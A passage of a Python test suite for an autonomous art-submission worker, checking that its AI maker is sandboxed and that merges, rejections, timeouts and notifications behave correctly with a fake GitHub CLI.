        if args[:2] == ("pr", "create"):
            self.branch = args[args.index("--head") + 1]
            self.closed = False
            return "https://github.com/kody-w/public-art-collective/pull/7\n"
        if args[:2] == ("pr", "view") and "files" in args[-1]:
            names = [line.split("\t") for line in git_bare(
                self.origin, "diff", "--name-status",
                f"{self.base}..{self.branch}").splitlines() if line.strip()]
            files = [{"path": path, "additions": 1, "deletions": 0}
                     for _, path in names]
            if self.extra_file:
                files.append({"path": self.extra_file, "additions": 1,
                              "deletions": 2})
            return json.dumps({"files": files, "state": "OPEN",
                               "baseRefName": self.base,
                               "headRefName": self.branch,
                               "isCrossRepository": False})
        if (args[:2] == ("pr", "view")
                and "statusCheckRollup" in args[-1]):
            result = (
                self.provenance_check_sequence.pop(0)
                if len(self.provenance_check_sequence) > 1
                else self.provenance_check_sequence[0]
            )
            if isinstance(result, BaseException):
                raise result
            state = "MERGED" if self.merged else "CLOSED" if self.closed else "OPEN"
            merge_state = (
                self.merge_state_sequence.pop(0)
                if len(self.merge_state_sequence) > 1
                else self.merge_state_sequence[0]
                if self.merge_state_sequence
                else self.merge_state_status
            )
            return json.dumps({
                "statusCheckRollup": result,
                "mergeStateStatus": merge_state,
                "state": state,
            })
        if args[:2] == ("pr", "merge"):
            sha = git_bare(self.origin, "rev-parse", self.branch).strip()
            git_bare(self.origin, "update-ref", f"refs/heads/{self.base}", sha)
            self.merge_sha = sha
            self.merged = True
            if self.raise_after_merge is not None:
                raise self.raise_after_merge
            return ""
        if args[:2] == ("pr", "view"):
            state = "MERGED" if self.merged else "CLOSED" if self.closed else "OPEN"
            return json.dumps({"state": state,
                               "merged": self.merged,
                               "mergeStateStatus": self.merge_state_status,
                               "mergeCommit": {"oid": getattr(self, "merge_sha", "")}})
        if args[:2] == ("pr", "close"):
            self.closed = True
            return ""
        raise AssertionError(f"unexpected gh call: {args}")

    def called(self, *prefix):
        return any(call[:len(prefix)] == prefix for call in self.calls)


class WorkerEnv(ScratchCase):
    """A worker pointed at a temp origin repo with a scripted GitHub."""

    def setUp(self):
        super().setUp()
        self.origin = self.home / "origin.git"
        seed = self.home / "seed"
        self.seed = seed
        seed.mkdir()
        git(seed, "init", "-b", "main")
        git(seed, "config", "user.email", "t@example.com")
        git(seed, "config", "user.name", "t")
        write_submission(seed, "already-here")
        (seed / "submissions" / "index.json").write_text('{"submissions": []}',
                                                         encoding="utf-8")
        validator = seed / EW.COLLECTIVE_VALIDATOR_PATH
        validator.parent.mkdir(parents=True)
        validator.write_text(
            TRUSTED_COLLECTIVE_VALIDATOR, encoding="utf-8")
        git(seed, "add", "-A")
        git(seed, "commit", "-m", "seed")
        git(self.home, "init", "--bare", "-b", "main", str(self.origin))
        git(seed, "remote", "add", "origin", str(self.origin))
        git(seed, "push", "-u", "origin", "main")
        self.gh = FakeGh(self.origin)
        for name, value in (("_gh", self.gh),):
            p = mock.patch.object(EW, name, value)
            p.start()
            self.addCleanup(p.stop)
        for name, value in (("identities", lambda: {s: f"rappid:test:{s}"
                                                    for s in EW.NB.NEIGHBORS}),
                            ("roll_call", lambda: {s: {"alive": True}
                                                   for s in EW.NB.NEIGHBORS}),
                            ("chain_path", lambda slug: self.home / f"{slug}.jsonl")):
            p = mock.patch.object(EW.NB, name, value)
            p.start()
            self.addCleanup(p.stop)
        self.cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin),
            "git_author_name": "test",
            "git_author_email": "t@example.com",
        })

    def replace_collective_validator(self, source):
        validator = self.seed / EW.COLLECTIVE_VALIDATOR_PATH
        if source is None:
            validator.unlink()
        else:
            validator.write_text(source, encoding="utf-8")
        git(self.seed, "add", "-A")
        git(self.seed, "commit", "-m", "change trusted validator")
        git(self.seed, "push", "origin", "main")

    def model_that_submits(self, slug="new-piece", cycle=1, previous=None,
                           result="CONTRIBUTED it made a thing"):
        def fake(staging, prompt, wcfg, depth=0, runtime=None):
            self.prompt = prompt
            staging = Path(staging)
            write_submission(staging / "out", slug,
                             meta_for(slug, cycle=cycle, previous=previous))
            (staging / "state-out.json").write_text(json.dumps({
                "cycle": cycle, "last_slug": slug, "notes": "learned things",
            }), encoding="utf-8")
            return "ok", f"working...\nSENTINEL_RESULT: {result}\n"
        return fake

    def workspaces(self):
        root = self.home / "state" / "evolve-workspaces"
        return sorted(p.name for p in root.iterdir()) if root.exists() else []


class WorkerRunTests(WorkerEnv):
    # ── the verified success path ──
    def test_a_verified_merge_updates_every_ledger_exactly_once(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertTrue(self.gh.merged)

        # the piece really is on the base branch now
        listed = git_bare(self.origin, "ls-tree", "--name-only", "-r", "main")
        self.assertIn("submissions/new-piece/piece.svg", listed)

        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(1, len(history))
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, history[0]["outcome"])
        self.assertEqual(summary["receipts"]["merge_commit"],
                         history[0]["merge_commit"])

        state = json.loads((self.state / "evolve-creative-state.json").read_text())
        self.assertEqual(1, state["cycle"])
        self.assertEqual("new-piece", state["last_slug"])

        self.assertEqual(1, len(self.frames))
        self.assertEqual("neighbor.acted", self.frames[0][1])
        self.assertTrue(self.frames[0][2]["merged"])

        self.assertEqual(1, len(self.notifications))
        self.assertIn(EW.SUCCESS_PREFIX, self.texts()[0])
        self.assertEqual([], self.workspaces(), "the temp clone must be removed")

    def test_the_second_cycle_must_continue_the_first(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        # a model that restarts the count at 1 is rejected, not published
        with mock.patch.object(EW, "run_model",
                               self.model_that_submits(slug="second-piece")):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("continuity", summary["detail"])
        # and the honest continuation is accepted
        with mock.patch.object(EW, "run_model",
                               self.model_that_submits(slug="second-piece", cycle=2,
                                                       previous="new-piece")):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)

    def test_the_prompt_forbids_publishing_and_names_the_invariants(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        for phrase in ("There is NO repository here", "no .git directory",
                       "no shell, no git, no gh and no network tool",
                       "clone you never see", "/out/submission/meta.json",
                       "You cannot create directories",
                       "slug goes in meta.json",
                       f"EXACTLY {EW.CANDIDATES_PER_ROUND}", "state-out.json"):
            self.assertIn(phrase, self.prompt)
        self.assertNotIn("/clone ", self.prompt,
                         "the maker is never told where the clone is")

    # ── the refusals ──
    def test_a_critical_check_before_the_merge_aborts_and_closes_the_pr(self):
        phases = {"start": healthy(), "pre-write": healthy(),
                  "pre-merge": critical("rb_workflows")}
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: phases[phase])

        self.assertEqual(EW.OUTCOME_ABORTED, summary["outcome"])
        self.assertIn("rb_workflows", summary["detail"])
        self.assertFalse(self.gh.called("pr", "merge"), "must not merge mid-outage")
        self.assertTrue(self.gh.called("pr", "close"), "the open PR must be closed")
        self.assertNotIn("submissions/new-piece",
                         git_bare(self.origin, "ls-tree", "--name-only", "-r", "main"))
        self.assertFalse(any(EW.SUCCESS_PREFIX in n for n in self.texts()))
        self.assertFalse((self.state / "evolve-creative-state.json").exists(),
                         "an aborted cycle must not advance the creative ledger")
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(EW.OUTCOME_ABORTED, history[0]["outcome"])
        self.assertEqual([], self.workspaces())

    def test_a_critical_check_at_the_start_never_spends_the_model(self):
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=self.cfg,
                                  health=lambda phase: critical("rv_validation"))
        self.assertEqual("skipped", summary["outcome"])
        model.assert_not_called()
        self.assertEqual([], EW.load_history())

    def test_degraded_runs_only_when_every_failing_id_is_allowlisted(self):
        allowed = {"status": "degraded", "critical": [],
                   "failed": ["w_openrappter_spin"], "checks": [], "summary": "x"}
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: allowed)
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)

        unlisted = {"status": "degraded", "critical": [],
                    "failed": ["w_openrappter_spin", "rb_shards"],
                    "checks": [], "summary": "x"}
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: unlisted)
        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("rb_shards", summary["reason"])
        model.assert_not_called()

    def test_a_pr_that_touches_more_than_the_submission_is_never_merged(self):
        self.gh.extra_file = "submissions/index.json"
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("index.json", summary["detail"])
        self.assertFalse(self.gh.called("pr", "merge"))
        self.assertTrue(self.gh.called("pr", "close"))
        self.assertFalse(any(EW.SUCCESS_PREFIX in n for n in self.texts()))

    def test_a_failed_pr_creation_does_not_orphan_the_pushed_branch(self):
        def failing_create(*args, timeout=None, **kw):
            self.gh.calls.append(args)
            if args[:2] == ("pr", "create"):
                raise EW.CommandError("gh pr create exited 1: rate limited")
            raise AssertionError(f"unexpected gh call: {args}")
        with mock.patch.object(EW, "_gh", failing_create), \
             mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_FAILED, summary["outcome"])
        branches = git_bare(self.origin, "for-each-ref", "--format=%(refname)",
                            "refs/heads/")
        self.assertEqual(["refs/heads/main"], branches.split(),
                         "a pushed branch with no PR must be deleted again")
        self.assertFalse(any(EW.SUCCESS_PREFIX in n for n in self.texts()))

    def test_missing_collective_validator_stops_before_push_or_pr(self):
        self.replace_collective_validator(None)
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(
                cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"], summary)
        self.assertIn("missing tools/build_index.py", summary["detail"])
        self.assertFalse(self.gh.called("pr", "create"))
        branches = git_bare(
            self.origin, "for-each-ref", "--format=%(refname)",
            "refs/heads/")
        self.assertEqual(["refs/heads/main"], branches.split())

    def test_a_timeout_is_recorded_without_a_success_shaped_alert(self):
        def timing_out(staging, prompt, wcfg, depth=0, runtime=None):
            return EW.OUTCOME_TIMEOUT, "copilot timed out after 60s"
        with mock.patch.object(EW, "run_model", timing_out):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_TIMEOUT, summary["outcome"])
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(1, len(history), "a timeout still consumed the budget")
        self.assertEqual(EW.OUTCOME_TIMEOUT, history[0]["outcome"])
        self.assertFalse(self.gh.calls, "nothing may reach GitHub after a timeout")
        self.assertEqual(1, len(self.notifications))
        self.assertNotIn(EW.SUCCESS_PREFIX, self.texts()[0])
        self.assertIn("timeout", self.texts()[0])
        self.assertFalse((self.state / "evolve-creative-state.json").exists())
        self.assertEqual([], self.workspaces(), "a timeout still cleans up")

    def test_the_real_timeout_path_kills_the_tree_and_reports_timeout(self):
        # A real process that ignores the clock, killed by the real code path.
        wcfg = dict(EW.worker_config({}), timeout_s=2)
        wcfg["fanout"] = {"isolated_home": False, "kill_grace_s": 1}
        argv = [sys.executable, "-c",
                "import subprocess, sys, time;"
                "p = subprocess.Popen([sys.executable, '-c', 'import time;"
                " time.sleep(90)']);"
                "open('gc.pid','w').write(str(p.pid)); time.sleep(90)"]
        with mock.patch.object(EW.SS, "confined_argv", return_value=argv), \
             mock.patch.object(EW.SS, "sandbox_wrap",
                               lambda a, w, e, profile_dir=None: a):
            status, out = EW.run_model(self.home, "prompt", wcfg)
        self.assertEqual(EW.OUTCOME_TIMEOUT, status)
        self.assertIn("timed out", out)
        self.assertEqual([], EW.live_processes(), "the registry is drained")
        grandchild = int((self.home / "gc.pid").read_text())
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline:
            try:
                os.kill(grandchild, 0)
            except ProcessLookupError:
                break
            time.sleep(0.05)
        else:
            self.fail("the maker's grandchild outlived the timeout")

    def test_a_declined_cycle_is_recorded_without_a_paintbrush(self):
        def declining(staging, prompt, wcfg, depth=0, runtime=None):
            return "ok", "SENTINEL_RESULT: DECLINED nothing worth making today\n"
        with mock.patch.object(EW, "run_model", declining):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_DECLINED, summary["outcome"])
        self.assertFalse(self.gh.calls)
        self.assertEqual([], self.notifications, "declines are quiet by default")
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(EW.OUTCOME_DECLINED, history[0]["outcome"])
        self.assertFalse((self.state / "evolve-creative-state.json").exists())

    def test_a_maker_cannot_reach_a_repository_at_all(self):
        seen = {}

        def looking_for_git(staging, prompt, wcfg, depth=0, runtime=None):
            staging = Path(staging)
            seen["entries"] = sorted(p.name for p in staging.iterdir())
            seen["git"] = list(staging.rglob(".git"))
            seen["add_dirs"] = [a for a in EW.maker_argv(wcfg, staging)]
            write_submission(staging / "out", "new-piece", meta_for("new-piece"))
            (staging / "state-out.json").write_text(json.dumps(
                {"cycle": 1, "last_slug": "new-piece", "notes": "n"}),
                encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"

        with mock.patch.object(EW, "run_model", looking_for_git):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertEqual([], seen["git"], "no .git may exist in the maker's root")
        self.assertNotIn("clone", seen["entries"])
        add_dirs = [seen["add_dirs"][i + 1] for i, a in enumerate(seen["add_dirs"])
                    if a == "--add-dir"]
        self.assertEqual(1, len(add_dirs))
        self.assertTrue(add_dirs[0].endswith("staging"), add_dirs)

    def test_a_missing_next_state_file_is_rejected_before_any_remote_call(self):
        def no_state(staging, prompt, wcfg, depth=0, runtime=None):
            write_submission(Path(staging) / "out", "new-piece",
                             meta_for("new-piece"))
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"
        with mock.patch.object(EW, "run_model", no_state):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("state-out.json", summary["detail"])
        self.assertFalse(self.gh.calls)

    def test_roles_rotate_across_passes(self):
        seen = []

        def watcher(staging, prompt, wcfg, depth=0, runtime=None):
            seen.append(wcfg["role"])
            return EW.OUTCOME_FAILED, "no model here"
        with mock.patch.object(EW, "run_model", watcher):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(2, len(seen))
        self.assertNotEqual(seen[0], seen[1], "one neighbor must not dominate")

    def test_the_worker_stands_down_for_the_stop_file(self):
        EW.STOP.write_text("halt", encoding="utf-8")
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("skipped", summary["outcome"])
        model.assert_not_called()

    def test_a_disabled_worker_does_nothing(self):
        cfg = dict(self.cfg, evolve_worker={"enabled": False})
        with mock.patch.object(EW, "run_model") as model:
            summary = EW.run_once(cfg=cfg, health=lambda phase: healthy())
        self.assertEqual("skipped", summary["outcome"])
        model.assert_not_called()


def child_result(role, n=6, ok=True, wave=1, error="", critique=(),
                 verifier=None):
    """A sub-sentinel report in the shape subsentinels.run_children returns."""
    report = None
    if ok:
        report = {
            "role": role,
            "candidates": [
                {"id": f"c{i}", "premise": f"{role} premise {i}",
                 "rationale": "because",
                 "scores": {d: 5 + (i % 3) for d in SS.SCORE_DIMENSIONS}}
                for i in range(1, n + 1)],
            "evidence": [{"claim": "checked", "source": "prior.json"}],
            "critique": list(critique),
        }
    return {"role": role, "wave": wave, "ok": ok, "error": error,
            "verifier": bool(wave >= 2 if verifier is None else verifier),
            "timed_out": False, "exit_code": 0 if ok else 1, "elapsed_s": 2.0,
            "report": report}


class FanoutIntegrationTests(WorkerEnv):
    """The fan-out inside a real cycle: bounded, binding, and never silent."""

    def setUp(self):
        super().setUp()
        self.cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin),
            "git_author_name": "test",
            "git_author_email": "t@example.com",
            "fanout": {"enabled": True, "children": 3},
        })

    def maker_using_finalists(self, slug="new-piece", cycle=1, previous=None,
                              honour=True, forge=None):
        """A maker that copies round1.json, the way the prompt tells it to.

        `honour=False` keeps its own ids; `forge` rewrites one field of one
        record while keeping every id — the attack the digests exist for.
        """
        def fake(staging, prompt, wcfg, depth=0, runtime=None):
            self.prompt = prompt
            staging = Path(staging)
            records = json.loads((staging / "round1.json").read_text())
            self.finalists = [c["id"] for c in records]
            if forge:
                records = [dict(r) for r in records]
                records[0].update(forge)
            write_submission(staging / "out", slug, meta_for(
                slug, cycle=cycle, previous=previous,
                round1_records=records if honour else None))
            (staging / "state-out.json").write_text(json.dumps({
                "cycle": cycle, "last_slug": slug, "notes": "n"}), encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"
        return fake

    def patched_children(self, results):
        return mock.patch.object(EW.SS, "run_children", return_value=results)

    def test_the_finalists_bind_round_one_and_the_cycle_merges(self):
        results = [child_result("novelty-archaeologist"),
                   child_result("execution-designer"),
                   child_result("adversarial-verifier", wave=2)]
        with self.patched_children(results), \
             mock.patch.object(EW, "run_model", self.maker_using_finalists()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertEqual(10, len(self.finalists))
        self.assertIn("THE TEN FINALISTS", self.prompt)
        self.assertIn("MUST be exactly these ten records", self.prompt)
        self.assertIn("round1.json", self.prompt)
        for cid in self.finalists:
            self.assertIn(cid, self.prompt)
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual(3, row["children"])
        self.assertEqual([], row["child_failures"])
        self.assertEqual(3, SS.children_spent([row]))

    def test_a_maker_that_ignores_its_sub_sentinels_is_rejected(self):
        results = [child_result("a"), child_result("b"),
                   child_result("adversarial-verifier", wave=2)]
        with self.patched_children(results), \
             mock.patch.object(EW, "run_model",
                               self.maker_using_finalists(honour=False)):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("exactly the ten finalists", summary["detail"])
        self.assertFalse(self.gh.calls, "nothing reaches GitHub")
        self.assertFalse(any(EW.SUCCESS_PREFIX in n for n in self.texts()))

    def test_a_partial_failure_that_still_yields_ten_continues(self):
        results = [child_result("a"), child_result("b"),
                   child_result("d", ok=False, error="timed out after 600s"),
                   child_result("adversarial-verifier", wave=2)]
        with self.patched_children(results), \
             mock.patch.object(EW, "run_model", self.maker_using_finalists()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual(["d: timed out after 600s"], row["child_failures"])
        self.assertIn("CHILDREN THAT FAILED", self.prompt,
                      "the maker is told what it did not get")

    def test_a_failed_fanout_never_reaches_the_maker(self):
        results = [child_result("a", ok=False, error="wrote no report"),
                   child_result("b", ok=False, error="exited 1"),
                   child_result("adversarial-verifier", wave=2, ok=False,
                                error="timed out")]
        with self.patched_children(results), \
             mock.patch.object(EW, "run_model") as maker:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_FANOUT, summary["outcome"])
        maker.assert_not_called()
        self.assertFalse(self.gh.calls)
        self.assertFalse(any(EW.SUCCESS_PREFIX in n for n in self.texts()))
        self.assertEqual(1, len(self.notifications))
        self.assertIn("fanout-failed", self.texts()[0])
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual(EW.OUTCOME_FANOUT, row["outcome"])
        self.assertEqual(3, row["children"], "children cost credit even so")
        self.assertEqual(3, len(row["child_failures"]))
        self.assertFalse((self.state / "evolve-creative-state.json").exists())
        self.assertEqual([], self.workspaces())

    def test_too_few_survivors_is_a_named_failure_not_nine_finalists(self):
        results = [child_result("a", n=5),
                   child_result("adversarial-verifier", wave=2, n=4)]
        with self.patched_children(results), \
             mock.patch.object(EW, "run_model") as maker:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_FANOUT, summary["outcome"])
        self.assertIn("9 candidate(s) survived", summary["detail"])
        maker.assert_not_called()

    def test_an_unavailable_fanout_skips_instead_of_making_art_alone(self):
        cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin),
            "fanout": {"enabled": True, "children": 3, "daily_child_budget": 0},
        })
        with mock.patch.object(EW, "run_model") as maker, \
             mock.patch.object(EW.SS, "run_children") as children:
            summary = EW.run_once(cfg=cfg, health=lambda phase: healthy())

        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("child budget spent", summary["reason"])
        maker.assert_not_called()
        children.assert_not_called()
        self.assertFalse(EW.HISTORY_PATH.exists(),
                         "deciding not to start spends nothing and writes no row")
        status = json.loads(EW.STATUS_PATH.read_text())
        self.assertEqual("skipped", status["outcome"])

    def test_a_nested_worker_run_refuses_itself(self):
        with mock.patch.dict(os.environ, {SS.DEPTH_ENV: "1"}), \
             mock.patch.object(EW, "run_model") as maker, \
             mock.patch.object(EW.SS, "run_children") as children:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("nested run refused", summary["reason"])
        maker.assert_not_called()
        children.assert_not_called()

    def test_children_are_planned_but_never_spawned_by_a_child(self):
        fcfg = SS.fanout_config(EW.worker_config(self.cfg))
        self.assertEqual(3, len(SS.plan_children(fcfg, [], 0)[0]))
        self.assertEqual([], SS.plan_children(fcfg, [], 1)[0])

    def test_children_receive_every_prior_submission_but_no_repository(self):
        results = [child_result("a"), child_result("b"),
                   child_result("adversarial-verifier", wave=2)]
        with self.patched_children(results) as children, \
             mock.patch.object(EW, "run_model", self.maker_using_finalists()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        prior = children.call_args.args[6]
        self.assertEqual(["already-here"], [p["slug"] for p in prior])
        self.assertIn("title", prior[0])
        workspace = children.call_args.args[2]
        self.assertFalse((Path(workspace) / "children" / "a" / ".git").exists(),
                         "a child never gets a repository of its own")

    def test_the_dry_run_reports_the_planned_cast(self):
        summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy(),
                              dry_run=True)
        self.assertEqual("dry-run", summary["outcome"])
        self.assertEqual(0, summary["depth"])
        self.assertEqual(["novelty-archaeologist", "execution-designer",
                          "adversarial-verifier"], summary["children"])

    def test_a_solo_cycle_still_works_when_the_fanout_is_off(self):
        cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin), "fanout": {"enabled": False}})
        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(EW.SS, "run_children") as children:
            summary = EW.run_once(cfg=cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        children.assert_not_called()
        self.assertNotIn("THE TEN FINALISTS", self.prompt)


class ArtNotificationTests(WorkerEnv):
    """The message a merge earns — and the silence everything else earns."""

    VIEW = ("https://kody-w.github.io/public-art-collective/"
            "view.html#/new-piece")
    SOURCE = ("https://github.com/kody-w/public-art-collective/blob/main/"
              "submissions/new-piece/piece.svg")

    def test_exactly_one_message_on_a_verified_merge(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertEqual(1, len(self.notifications),
                         "one merge, one message — not two, not zero")

        note = self.notifications[0]
        text = note["text"]
        self.assertIn(EW.SUCCESS_PREFIX, text)
        self.assertIn("New Piece", text, "the title a human recognises")
        self.assertIn(f"Public Art Collective: {self.VIEW}", text,
                      "one tap to the artwork")
        self.assertNotIn("Static HTML report:", text)
        self.assertEqual("art", note["kind"])
        self.assertFalse(note["attach_report"])
        self.assertEqual("+15550000002", note["to"],
                         "art news goes to the configured report number")

    def test_the_message_carries_a_one_sentence_concept(self):
        meta = meta_for("new-piece", _artist_statement=(
            "A clock that lies about the time. Then it goes on at length "
            "about clocks for several more sentences nobody will read on a "
            "phone."))

        def maker(staging, prompt, wcfg, depth=0, runtime=None):
            write_submission(Path(staging) / "out", "new-piece", meta)
            (Path(staging) / "state-out.json").write_text(json.dumps(
                {"cycle": 1, "last_slug": "new-piece", "notes": "n"}),
                encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"

        with mock.patch.object(EW, "run_model", maker):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        text = self.texts()[0]
        self.assertIn("A clock that lies about the time.\n", text,
                      "one sentence, no trailing whitespace before the links")
        self.assertNotIn("nobody will read on a phone", text)

    def test_a_long_statement_is_truncated_not_pasted(self):
        self.assertEqual(80, len(EW.concept_sentence(
            {"_concept": "x" * 500}, limit=80)))
        self.assertTrue(EW.concept_sentence({"_concept": "x" * 500},
                                            limit=80).endswith("\u2026"))

    def test_the_concept_falls_back_to_the_winning_premise(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertIn("premise 1.1", self.texts()[0],
                      "the premise that actually won its cycle")

    def test_the_message_is_built_after_the_merge_without_a_private_report(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        note = self.notifications[0]
        self.assertFalse(note["attach_report"],
                         "final art carries public platform links, not LAN reports")
        self.assertEqual([EW.OUTCOME_CONTRIBUTED],
                         [r["outcome"] for r in note["history"]],
                         "the ledger is written before the message is built")

    def test_commons_repo_wins_over_the_worker_repo(self):
        cfg = dict(self.cfg, commons_repo="someone-else/other-commons")
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=cfg, health=lambda phase: healthy())
        text = self.texts()[0]
        self.assertIn("https://someone-else.github.io/other-commons/"
                      "view.html#/new-piece", text)

    def test_no_message_for_a_timeout(self):
        with mock.patch.object(EW, "run_model",
                               lambda ws, p, w, d=0, r=None: (EW.OUTCOME_TIMEOUT, "timed out")):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(1, len(self.notifications))
        self.assertNotIn("Public Art Collective:", self.texts()[0])
        self.assertNotIn(EW.SUCCESS_PREFIX, self.texts()[0])

    def test_no_message_for_a_declined_cycle(self):
        with mock.patch.object(
                EW, "run_model",
                lambda ws, p, w, d=0, r=None: ("ok", "SENTINEL_RESULT: DECLINED not today\n")):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual([], self.notifications)

    def test_a_model_claiming_success_without_a_merge_gets_no_art_message(self):
        # SENTINEL_RESULT is a claim; the health abort means nothing merged.
        phases = {"start": healthy(), "pre-write": healthy(),
                  "pre-merge": critical("rb_workflows")}
        with mock.patch.object(EW, "run_model", self.model_that_submits(
                result="CONTRIBUTED and it is live, I promise")):
            summary = EW.run_once(cfg=self.cfg,
                                  health=lambda phase: phases[phase])
        self.assertEqual(EW.OUTCOME_ABORTED, summary["outcome"])
        for text in self.texts():
            self.assertNotIn("Public Art Collective:", text)
            self.assertNotIn(EW.SUCCESS_PREFIX, text)

    def test_no_art_message_when_the_gate_rejects(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits(
                slug="second-piece", cycle=9)):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertFalse(any("Public Art Collective:" in t for t in self.texts()))


class ArtUrlTests(unittest.TestCase):
    """URL derivation is deterministic, encoded, and per-extension correct."""

    def urls(self, piece_path, commons="kody-w/public-art-collective",
             base="main"):
        return EW.art_urls({"commons_repo": commons},
                           {"repo": "ignored/when-commons-set",
                            "base_branch": base},
                           {"piece_path": piece_path})

    def test_every_supported_extension_maps_to_its_own_path(self):
        for ext in sorted(EW.KIND_EXTENSIONS.values()):
            with self.subTest(ext=ext):
                view, source = self.urls(f"submissions/a-slug/piece{ext}")
                self.assertEqual(
                    f"https://kody-w.github.io/public-art-collective/"
                    f"view.html#/a-slug", view)
                self.assertEqual(
                    f"https://github.com/kody-w/public-art-collective/blob/main/"
                    f"submissions/a-slug/piece{ext}", source)

    def test_path_separators_survive_and_segments_are_encoded(self):
        view, source = self.urls("submissions/a b/piece.svg")
        self.assertIn("/view.html#/a%20b", view)
        self.assertIn("/submissions/a%20b/piece.svg", source)

    def test_a_non_default_branch_lands_in_the_source_url(self):
        _, source = self.urls("submissions/a/piece.md", base="trunk")
        self.assertIn("/blob/trunk/", source)

    def test_the_pages_host_is_lowercased_but_the_repo_is_not(self):
        view, source = self.urls("submissions/a/piece.svg",
                                 commons="Kody-W/Public-Art-Collective")
